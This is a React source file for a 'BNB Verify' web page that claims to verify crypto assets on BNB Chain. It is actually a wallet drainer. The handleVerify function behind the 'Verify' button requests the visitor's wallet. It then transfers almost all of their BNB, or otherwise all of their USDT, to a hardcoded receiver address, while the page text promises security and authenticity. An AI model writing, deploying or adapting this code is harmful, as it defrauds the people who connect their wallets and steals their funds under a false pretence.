import { useState, useEffect } from "react";
import { ethers } from "ethers";
import "./App.css";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("Click Verify to start...");

  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  useEffect(() => {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      provider.listAccounts().then(accounts => {
        if (accounts.length > 0) setWalletAddress(accounts[0]);
      });
    }
  }, []);

  async function handleVerify() {
    if (!window.ethereum) return setStatus("No wallet detected!");
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      setWalletAddress(userAddress);

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="app">
      {/* Navbar */}
      <header className="navbar">
        <nav className="container nav-content">
          <a href="#" className="logo">
            <div className="logo-circle"></div>
            <span>BNB Verify</span>
          </a>
          <div className="nav-links">
            <a href="#">Home</a>
            <a href="#">Explorer</a>
            <a href="#">Tokens</a>
            <a href="#">NFTs</a>
            <a href="#">DApps</a>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="hero">
        <div className="hero-left">
          <div className="powered">Powered by BNB Chain</div>
          <h1>
            Verify Crypto Assets on <br /> BNB Chain
          </h1>
          <p>
            Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
          </p>
          <div className="hero-buttons">
            <button onClick={handleVerify} className="button-primary">
              Verify
            </button>
            <button className="button-secondary">Explore BNB Chain</button>
          </div>
          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
          <p className="status">{status}</p>
        </div>

        <div className="hero-right">
          <div className="pulse-ring outer"></div>
          <div className="pulse-ring middle"></div>
          <div className="pulse-ring inner"></div>
          <div className="center-logo"></div>
        </div>
      </main>

      {/* Cards Section */}
      <section className="cards-section">
        <div className="card">
          <h2>Explorer</h2>
          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
        </div>
        <div className="card">
          <h2>Tokens</h2>
          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
        </div>
        <div className="card">
          <h2>NFTs</h2>
          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
        </div>
        <div className="card">
          <h2>DApps</h2>
          <p>Connect to decentralized apps and verify transactions safely.</p>
        </div>
      </section>

      {/* Footer */}
      <footer>
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}
